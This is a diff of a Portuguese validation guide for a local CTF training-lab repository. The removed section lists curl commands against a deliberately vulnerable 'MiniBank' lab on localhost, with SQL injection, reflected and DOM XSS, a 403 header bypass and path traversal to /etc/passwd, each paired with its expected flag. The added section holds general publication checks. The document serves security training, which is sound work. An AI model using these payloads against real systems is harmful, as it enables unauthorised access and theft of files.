@@ -1,57 +1,108 @@
-# Validacao do Release Candidate
+# Validação geral do repositório ctf-labs
 
-Comandos esperados para validar o `lab-01-minibank`.
+Este documento reúne checks gerais para validar se o repositório está pronto para uso público/local. Validações específicas ficam dentro de cada lab, em seu próprio `VALIDATION.md`.
+
+## Escopo
+
+Este arquivo valida o repositório como coleção.
+
+Cada lab possui sua própria validação técnica, documentação e gabarito. Para validar um lab específico, entre na pasta do lab e siga o `VALIDATION.md` local quando existir. Quando não houver `VALIDATION.md` local, consulte o `README.md`, `WALKTHROUGH.md`, `SOLUTION.md` ou `SOLUTIONS.md` do lab.
+
+## Checks gerais
+
+Verificar estado do repositório:
 
 ```bash
-cd ~/ctf-labs
-grep -Rho "FLAG{[^}]*}" lab-01-minibank | sort -u
+git status --short
 ```
+
+Procurar arquivos que normalmente não devem ser publicados por acidente:
 
 ```bash
-cd ~/ctf-labs/lab-01-minibank
-sudo docker compose up --build
+find . -name ".env" -o -name "cookies.txt" -o -name "node_modules" -o -name "*.pem" -o -name "*.key"
 ```
+
+Listar arquivos versionados que parecem conter material de solução, flags ou credenciais:
 
 ```bash
-curl -i http://localhost:8088
-curl -i http://localhost:8088/status
-curl -i http://localhost:8088/robots.txt
-curl -i http://127.0.0.1:8088/admin/reports
-curl -i http://127.0.0.1:8088/admin/reports -H "X-Original-URL: /admin/reports"
-curl -i http://localhost:8088/dev.txt
-curl -i -X POST http://127.0.0.1:8088/login -d "username=naoexiste" -d "password=teste"
-curl -i -X POST http://127.0.0.1:8088/login -d "username=joao" -d "password=errada"
-curl -i -X POST http://127.0.0.1:8088/login -d "username=admin' OR '1'='1' -- " -d "password=teste"
-curl -i "http://127.0.0.1:8088/search?q=%3Cscript%3Ealert(1)%3C%2Fscript%3E"
-curl -i "http://localhost:8088/download?file=public-info.txt"
-curl -i "http://localhost:8088/download?file=report-q2.txt"
-curl -i "http://localhost:8088/download?file=../../../../etc/passwd"
-curl -i "http://localhost:8088/download?file=../config/legacy.conf"
+git ls-files | grep -Ei "solution|walkthrough|validation|flag|secret|token|password|senha|\\.env|key|pem"
 ```
 
-Validacao manual no navegador para DOM XSS:
+Como o repositório é público completo, arquivos de solução, walkthrough, flags e segredos fictícios de CTF podem aparecer. O objetivo do check é identificar acidentalmente arquivos reais, como `.env`, chaves privadas, cookies ou credenciais pessoais.
+
+## Validação por lab
+
+### Lab 1 — MiniBank
+
+```bash
+cd lab-01-minibank
+docker compose up --build
+```
+
+Se existir validação interna, consulte também `README.md`, `WALKTHROUGH.md`, `SOLUTION.md` e validações locais.
+
+### Lab 2 — NeonVault
+
+```bash
+cd lab-02-neonvault
+docker compose up --build
+```
+
+Em outro terminal:
+
+```bash
+bash scripts/validate.sh
+```
+
+Resultado esperado:
 
 ```text
-http://127.0.0.1:8088/client-tools#msg=<img src=x onerror=alert(1)>
+34 OK, 0 FAIL
 ```
 
-Resultados esperados para o login:
+### Lab 3 — NetAudit
 
-- usuario inexistente: `Usuario nao encontrado.`
-- usuario existente com senha errada: `Senha invalida.`
-- SQL Injection: `302 Found` com `Location: /dashboard`
+```bash
+cd lab-03-netaudit
+docker compose up --build
+```
 
-Resultados esperados para as novas falhas:
+Consultar:
 
-- 403 direto: `HTTP/1.1 403 Forbidden`, sem flag
-- 403 bypass: retorna `FLAG{403_bypass_capturado}`
-- XSS basico: resposta contem o payload refletido e `FLAG{xss_basico_capturado}`
-- DOM XSS: validacao no navegador executa o handler do elemento injetado e mostra `FLAG{dom_xss_capturado}`
+```text
+README.md
+SOLUTION.md
+WALKTHROUGH.md
+```
 
-Resultados esperados para o Path Traversal:
+### Lab 4 — SentinelCore
 
-- `/status`: vaza `internal_path=/usr/src/app`
-- `public-info.txt`: prova o download normal
-- `report-q2.txt`: revela a pista `config` e `legacy.conf`
-- `../../../../etc/passwd`: prova leitura fora de `/usr/src/app/files`
-- `../config/legacy.conf`: retorna `FLAG{path_traversal_capturada}`
+```bash
+cd lab-04-sentinelcore
+docker compose up --build
+```
+
+Consultar:
+
+```text
+README.md
+STUDENT-GUIDE.md
+WALKTHROUGH.md
+```
+
+## Checklist antes de publicar
+
+- [ ] `README.md` raiz atualizado.
+- [ ] Todos os labs listados no `README.md` raiz.
+- [ ] Aviso de uso autorizado presente.
+- [ ] Aviso de spoilers presente.
+- [ ] Nenhum arquivo `.env` real versionado.
+- [ ] Nenhuma chave privada real versionada.
+- [ ] Nenhum cookie local versionado.
+- [ ] Containers sobem localmente.
+- [ ] Labs não devem ser expostos na internet.
+- [ ] Arquivos de solução/walkthrough são intencionais.
+
+## Observação sobre spoilers
+
+Este repositório pode conter spoilers completos por decisão do autor. Quem quiser praticar como desafio deve evitar `WALKTHROUGH.md`, `SOLUTION.md` e `SOLUTIONS.md` até tentar resolver.
